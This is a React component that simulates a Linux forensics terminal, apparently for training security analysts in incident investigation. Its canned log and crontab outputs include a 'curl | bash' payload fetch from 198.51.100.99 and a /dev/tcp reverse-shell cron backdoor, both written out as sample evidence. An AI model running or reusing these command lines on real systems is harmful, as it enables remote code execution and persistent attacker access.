import React, { useState, useRef, useEffect } from 'react';
import { Terminal as TerminalIcon, Shield, HelpCircle, RotateCcw } from 'lucide-react';

export const LinuxTerminalSandbox: React.FC = () => {
  const [inputVal, setInputVal] = useState('');
  const [history, setHistory] = useState<Array<{ cmd: string; output: string | React.ReactNode }>>([
    {
      cmd: 'welcome',
      output: (
        <div className="text-slate-400 space-y-1">
          <div>Linux Security & Telemetry Forensics Terminal v5.15.0-generic</div>
          <div>Type <span className="text-cyan-400 font-mono">help</span> for suggested commands or investigate <span className="text-emerald-400 font-mono">/var/log/auth.log</span>.</div>
        </div>
      )
    }
  ]);

  const bottomRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [history]);

  const handleCommand = (e: React.FormEvent) => {
    e.preventDefault();
    const cmd = inputVal.trim();
    if (!cmd) return;

    let output: string | React.ReactNode = '';
    const lower = cmd.toLowerCase();

    if (lower === 'clear') {
      setHistory([]);
      setInputVal('');
      return;
    } else if (lower === 'help') {
      output = (
        <div className="space-y-1 text-slate-300">
          <div className="text-cyan-400 font-bold">Available Forensic Commands:</div>
          <div>• <code className="text-emerald-400">cat /var/log/auth.log</code> - Inspect SSH & sudo authentication logs</div>
          <div>• <code className="text-emerald-400">grep Failed /var/log/auth.log</code> - Filter brute-force attempts</div>
          <div>• <code className="text-emerald-400">grep sudo /var/log/auth.log</code> - Check privilege escalation commands</div>
          <div>• <code className="text-emerald-400">find / -perm -4000 2&gt;/dev/null</code> - Locate SUID root binaries</div>
          <div>• <code className="text-emerald-400">ls -la /tmp/.hidden</code> - Inspect suspicious temporary directories</div>
          <div>• <code className="text-emerald-400">crontab -l</code> - Check scheduled persistence tasks</div>
          <div>• <code className="text-emerald-400">id</code> or <code className="text-emerald-400">whoami</code> - View current user privileges</div>
        </div>
      );
    } else if (lower.includes('auth.log') && lower.includes('grep') && lower.includes('failed')) {
      output = (
        <div className="text-red-300 space-y-0.5">
          <div>Oct 03 14:10:01 web-prod sshd[1204]: Failed password for invalid user admin from 198.51.100.42 port 49122 ssh2</div>
          <div>Oct 03 14:10:04 web-prod sshd[1205]: Failed password for invalid user admin from 198.51.100.42 port 49124 ssh2</div>
          <div>Oct 03 14:10:06 web-prod sshd[1207]: Failed password for invalid user root from 198.51.100.42 port 49128 ssh2</div>
        </div>
      );
    } else if (lower.includes('auth.log') && lower.includes('sudo')) {
      output = (
        <div className="text-amber-300 space-y-0.5">
          <div>Oct 03 14:10:15 web-prod sudo: deployer : TTY=pts/0 ; PWD=/tmp/.hidden ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.99/payload.sh | bash</div>
          <div className="text-red-400 font-bold">ALERT: Unapproved curl-pipe-to-bash executed under root privileges!</div>
        </div>
      );
    } else if (lower.includes('auth.log')) {
      output = (
        <div className="text-slate-300 space-y-0.5">
          <div>Oct 03 14:09:50 web-prod systemd-logind[412]: New session c1 of user deployer.</div>
          <div className="text-red-300">Oct 03 14:10:01 web-prod sshd[1204]: Failed password for invalid user admin from 198.51.100.42 port 49122 ssh2</div>
          <div className="text-red-300">Oct 03 14:10:04 web-prod sshd[1205]: Failed password for invalid user admin from 198.51.100.42 port 49124 ssh2</div>
          <div className="text-emerald-400">Oct 03 14:10:08 web-prod sshd[1206]: Accepted publickey for deployer from 198.51.100.42 port 49130 ssh2: RSA SHA256:x7K9...</div>
          <div className="text-amber-300">Oct 03 14:10:15 web-prod sudo: deployer : TTY=pts/0 ; PWD=/tmp/.hidden ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.99/payload.sh | bash</div>
        </div>
      );
    } else if (lower.includes('perm -4000') || lower.includes('suid')) {
      output = (
        <div className="space-y-0.5">
          <div className="text-slate-400">/usr/bin/passwd (standard)</div>
          <div className="text-slate-400">/usr/bin/sudo (standard)</div>
          <div className="text-slate-400">/usr/bin/chfn (standard)</div>
          <div className="text-red-400 font-bold bg-red-950/40 p-1 rounded">
            /tmp/.hidden/escalate (ANOMALOUS: SUID binary in /tmp owned by root with rwsr-xr-x)
          </div>
        </div>
      );
    } else if (lower.includes('/tmp')) {
      output = (
        <div className="text-slate-300 space-y-0.5">
          <div>drwxrwxrwt  3 root root 4096 Oct  3 14:10 .</div>
          <div>drwxr-xr-x 23 root root 4096 Oct  1 09:00 ..</div>
          <div className="text-red-400 font-bold">-rwsr-xr-x  1 root root 18400 Oct  3 14:10 .hidden/escalate</div>
          <div>-rw-r--r--  1 root root   240 Oct  3 14:11 payload.sh</div>
        </div>
      );
    } else if (lower === 'crontab -l') {
      output = (
        <div className="text-red-400 font-mono">
          * * * * * root /bin/bash -c &apos;bash -i &gt;&amp; /dev/tcp/198.51.100.99/9001 0&gt;&amp;1&apos; # Cron backdoor!
        </div>
      );
    } else if (lower === 'whoami' || lower === 'id') {
      output = 'uid=1001(deployer) gid=1001(deployer) groups=1001(deployer),27(sudo)';
    } else {
      output = `bash: ${cmd}: command not recognized. Type "help" for valid forensics commands.`;
    }

    setHistory(prev => [...prev, { cmd, output }]);
    setInputVal('');
  };

  return (
    <div className="bg-[#0b101b] border border-slate-800 rounded-xl overflow-hidden shadow-2xl font-mono text-xs">
      <div className="bg-[#0f172a] px-4 py-3 border-b border-slate-800 flex items-center justify-between">
        <div className="flex items-center space-x-2 text-emerald-400 font-semibold">
          <TerminalIcon className="w-4 h-4" />
          <span>analyst@soc-investigation-host: ~</span>
        </div>
        <div className="flex gap-2">
          <button
            onClick={() => setInputVal('cat /var/log/auth.log')}
            className="px-2 py-0.5 rounded bg-slate-800 text-slate-300 hover:text-white"
          >
            auth.log
          </button>
          <button
            onClick={() => setInputVal('find / -perm -4000 2>/dev/null')}
            className="px-2 py-0.5 rounded bg-slate-800 text-red-300 hover:text-white"
          >
            find SUID
          </button>
          <button
            onClick={() => setHistory([])}
            className="px-2 py-0.5 rounded bg-slate-800 text-slate-400 hover:text-white"
            title="Clear terminal"
          >
            Clear
          </button>
        </div>
      </div>

      <div className="p-4 min-h-[260px] max-h-[380px] overflow-y-auto space-y-3 bg-[#050811]">
        {history.map((h, i) => (
          <div key={i} className="space-y-1">
            <div className="flex items-center text-cyan-400">
              <span className="text-emerald-400 mr-2">analyst@soc:~$</span>
              <span>{h.cmd}</span>
            </div>
            <div className="pl-4 border-l border-slate-800">{h.output}</div>
          </div>
        ))}
        <div ref={bottomRef} />
      </div>

      <form onSubmit={handleCommand} className="p-3 bg-[#0a0d14] border-t border-slate-800 flex items-center gap-2">
        <span className="text-emerald-400 shrink-0 font-bold">analyst@soc:~$</span>
        <input
          type="text"
          value={inputVal}
          onChange={e => setInputVal(e.target.value)}
          placeholder="Type command (e.g. cat /var/log/auth.log, find / -perm -4000, help)..."
          className="w-full bg-transparent text-emerald-300 focus:outline-none placeholder-slate-600"
          autoFocus
        />
        <button type="submit" className="px-3 py-1 bg-emerald-600 hover:bg-emerald-500 text-black font-semibold rounded text-xs">
          Run
        </button>
      </form>
    </div>
  );
};
